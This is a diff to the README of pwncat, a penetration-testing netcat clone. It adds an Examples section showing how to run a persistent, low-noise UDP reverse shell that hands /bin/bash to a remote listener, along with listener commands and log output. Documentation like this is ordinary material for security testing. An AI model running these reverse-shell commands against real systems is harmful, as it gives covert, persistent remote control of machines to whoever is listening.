@@ -6,6 +6,7 @@
 **[Documentation](#closed_book-documentation)** |
 **[Usage](#computer-usage)** |
 **[cytopia sec tools](#lock-cytopia-sec-tools)** |
+**[Examples](#bulb-examples)** |
 **[Contributing](#octocat-contributing)** |
 **[Disclaimer](#exclamation-disclaimer)** |
 **[License](#page_facing_up-license)**
@@ -22,6 +23,8 @@
 [![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)
 [![Build Status](https://github.com/cytopia/pwncat/workflows/testing/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=testing)
 
+
+> #### Netcat on steroids with FW and IPS evasion, bind and reverse shell, local and remote port-forward.
 
 Dependency-less Python 2 and Python 3 compatible implementation of netcat which works on 32bit and 64bit systems to easily pivot your target.
 
@@ -236,6 +239,64 @@ advanced arguments:
 misc arguments:
   -h, --help            Show this help message and exit
   -V, --version         Show version information and exit
+```
+
+
+## :bulb: Examples
+
+Find below some more detailed and advanced examples.
+
+
+### Unbreakable UDP reverse shell
+Why unbreakable? Because it will keep coming to you, also if you kill your listening server.
+```bash
+# The client
+# --exec            # Provide this executable
+# --nodns           # Keep the noise down and don't resolve hostnames
+# --udp             # Use UDP mode
+# --udp-ping-intvl  # Ping the server every 10 seconds
+
+pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
+```
+If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
+```bash
+# The server
+# -u   # Use UDP mode
+# -l   # Listen for incoming connections
+pwncat -u -l -vvvvv
+```
+You will see (among all the gibberish) a TRACE message:
+```
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
+```
+As soon as you saw this on the listener, you can issue commands to the client.
+All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
+your server and start it again in silent mode:
+```bash
+# The server
+pwncat -u -l -vvvvv
+```
+Now wait a maximum of 10 seconds and you can issue commands.
+Having no info messages at all, are also troublesome. You might also want to know what is going
+on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
+the notifications to a logfile:
+```bash
+# The server
+# 2> comm.txt   # This redirects the messages to a logfile instead
+pwncat -u -l -vvv 2> comm.txt
+```
+Now all you'll see in your server window are the actual command inputs and outputs.
+If you want to see what's going on behind the scene, open a second terminal window and tail
+the `comm.txt` file:
+```
+# View communication info
+tail -fn50 comm.txt
+
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
 ```
 
 
